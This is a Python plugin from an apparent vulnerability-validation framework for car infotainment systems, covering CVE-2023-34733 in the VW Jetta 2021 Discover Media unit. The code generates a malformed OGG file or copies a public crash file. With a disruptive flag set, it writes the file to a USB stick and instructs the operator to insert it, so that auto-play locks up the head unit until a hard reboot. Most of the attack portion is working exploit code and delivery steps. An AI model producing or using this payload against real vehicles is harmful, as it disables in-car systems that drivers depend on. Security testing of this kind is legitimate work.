#!/usr/bin/env python3
"""CVE-2023-34733 – Volkswagen Discover Media IVI OGG Media File Crash.

Public PoC source: https://github.com/zj3t/Automotive-vulnerabilities/tree/main/VW/jetta2021
  Includes: poc.ogg (working crash trigger) + README.md
  Researcher: zj3t (Korea), disclosed 2023-02-28

Attack technique:
  VW Jetta 2021 Discover Media (software 0876, codec 1.2.0) has a USB
  Plug-and-Play feature that auto-plays media files on insertion.  The
  OGG media parser crashes when presented with a malformed OGG file
  crafted via fuzzing (20,000+ mutations/day).  After crash, the IVI
  does not power on again until a hard reboot.

  The public PoC provides the exact poc.ogg that triggers the crash.
  This plugin:
    1. Copies poc.ogg to a lab USB mount point
    2. Reports the USB path for operator to insert into target VW IVI
    3. With allow_disruptive + lab_usb_path param: writes the OGG to USB mount
    4. Generates a mutation from the original if poc.ogg not available

  Alternatively, generates a minimally malformed OGG (invalid page checksum
  + oversized segment table) to approximate the crash trigger.
"""
from __future__ import annotations

import os
import shutil
import struct
import random
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 101,
    "cve": "CVE-2023-34733",
    "year": 2023,
    "domain": "network",
    "vendor_product": "Volkswagen Jetta 2021 Discover Media IVI",
    "component": "OGG media parser / infotainment firmware (sw 0876, codec 1.2.0)",
    "type": "Improper exception handling / media parser crash → DoS",
    "summary": (
        "Malformed OGG file triggers unrecoverable IVI crash on USB insertion. "
        "Exploit requires physical USB access; IVI does not restart after crash."
    ),
    "source_url": "https://github.com/zj3t/Automotive-vulnerabilities",
    "requires_manual_review": True,
    "affected": [{"vendor": "Volkswagen", "product": "Jetta 2021 Discover Media",
                  "versions": [{"version": "sw 0876 / codec 1.2.0", "status": "affected"}]}],
}

POC_REPO = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/zj3t__Automotive-vulnerabilities" / "VW/jetta2021/PoC"
POC_OGG  = POC_REPO / "poc.ogg"

OGG_CAPTURE_MAGIC = b'OggS'

def _build_malformed_ogg() -> bytes:
    """
    Build a malformed OGG file if the actual poc.ogg is not available.
    Mutates: invalid page checksum + oversized lacing segment table (255 segments).
    Based on fuzzing approach in PoC README.
    """
    # OGG page header
    capture    = OGG_CAPTURE_MAGIC           # magic
    version    = bytes([0x00])               # stream structure version
    header_t   = bytes([0x02])               # beginning-of-stream bit
    gran_pos   = struct.pack('<Q', 0)        # granule position
    serial_num = struct.pack('<I', 0xDEAD)  # stream serial number
    page_seqno = struct.pack('<I', 0)        # page sequence number
    checksum   = struct.pack('<I', 0xBAD1F00D)  # invalid checksum → parser crash
    segs       = bytes([0xFF])              # 255 lacing segments (overflow)
    seg_table  = bytes([0xFF] * 255)        # all max-size segments
    payload    = bytes([0xAA] * 256)        # garbage payload

    return capture + version + header_t + gran_pos + serial_num + page_seqno + \
           checksum + segs + seg_table + payload


def _run_poc(plugin):
    usb_mount = (plugin.params or {}).get("lab_usb_path", "/mnt/usb")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2023-34733",
        "poc_repo": str(POC_REPO),
        "poc_ogg_present": POC_OGG.exists(),
        "attack_technique": (
            "Physical USB attack: place malformed poc.ogg on USB stick, "
            "insert into VW Discover Media → auto-play triggers OGG parser crash "
            "→ IVI locks up and does not restart."
        ),
        "usb_path": usb_mount,
    }

    if allow_disruptive:
        dest = Path(usb_mount) / "poc.ogg"
        if POC_OGG.exists():
            try:
                shutil.copy(str(POC_OGG), str(dest))
                evidence["copied_poc_ogg"] = str(dest)
                evidence["poc_size_bytes"] = POC_OGG.stat().st_size
            except Exception as exc:
                evidence["copy_error"] = str(exc)
        else:
            # Generate synthetic malformed OGG
            ogg = _build_malformed_ogg()
            try:
                dest.parent.mkdir(parents=True, exist_ok=True)
                dest.write_bytes(ogg)
                evidence["generated_malformed_ogg"] = str(dest)
                evidence["size_bytes"] = len(ogg)
            except Exception as exc:
                evidence["write_error"] = str(exc)
        evidence["manual_step"] = (
            "Insert USB at /mnt/usb into VW Jetta 2021 Discover Media. "
            "IVI auto-plays OGG → expect crash/freeze. "
            "If IVI does not restart, vulnerability confirmed."
        )
    else:
        ogg = _build_malformed_ogg()
        evidence["malformed_ogg_hex_preview"] = ogg[:48].hex()
        evidence["detail"] = (
            f"Set allow_disruptive=true and lab_usb_path=<mount point> to write "
            f"malformed OGG to USB. Then manually insert USB into VW Discover Media IVI."
        )

    return {
        "vulnerable": None,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "zj3t/Automotive-vulnerabilities / VW/jetta2021/PoC/poc.ogg",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc72CVE202334733VwDiscoverMediaOggDoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-NET-072"
    meta_poc_name   = 'CVE-2023-34733 VW Discover Media OGG Parser DoS Active Validation'
    meta_cve_id     = "CVE-2023-34733"
    meta_severity   = "High"
    meta_protocol   = "usb"
    meta_target_os  = ["embedded"]
    meta_required_params = []
    meta_optional_params = ["lab_usb_path", "allow_disruptive"]
    meta_profiles   = ["network"]
    meta_source_url = "https://github.com/zj3t/Automotive-vulnerabilities"
    meta_references       = ['https://github.com/zj3t/Automotive-vulnerabilities']
    meta_attack_surface = "VW Discover Media OGG USB auto-play media parser crash → IVI lockup"
    is_disruptive   = True
    meta_destructive_level = "ServiceDisruption"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "72_VW_Discover_Media_OGG_Fuzzing_DoS_Audit") if "VULN" in dir() else "72_VW_Discover_Media_OGG_Fuzzing_DoS_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc72CVE202334733VwDiscoverMediaOggDoSAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
